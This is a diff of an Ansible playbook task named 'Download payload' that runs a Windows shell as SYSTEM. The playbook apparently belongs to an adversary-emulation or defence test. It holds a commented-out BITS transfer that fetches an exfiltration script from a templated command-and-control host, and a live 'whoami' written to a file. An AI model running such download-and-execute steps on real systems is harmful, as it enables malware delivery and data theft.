@@ -6,12 +6,12 @@
   tasks:
           - name: Download payload
             tags: always
-            # If you want to use HTTPS, make sure remote certificate is valid or a add root ca if self-signed
+            become: yes
+            ansible_become_user: "SYSTEM"
             win_shell: |
+            # If you want to use HTTPS, make sure remote certificate is valid or a add root ca if self-signed
               #Start-BitsTransfer -Priority foreground -Source http://{{ cnc_fqdn }}:{{ cnc_port }}/{{ exfil_script_windows }} -Destination c:\TEMP\bitsadmin_flag.ps1
               whoami > c:\temp\whoami.txt
-            become: yes
-            ansible_become_user: SYSTEM
           - name: sleep for 10 seconds and continue with play if download was blocked or not
             tags: always
             wait_for: timeout=10
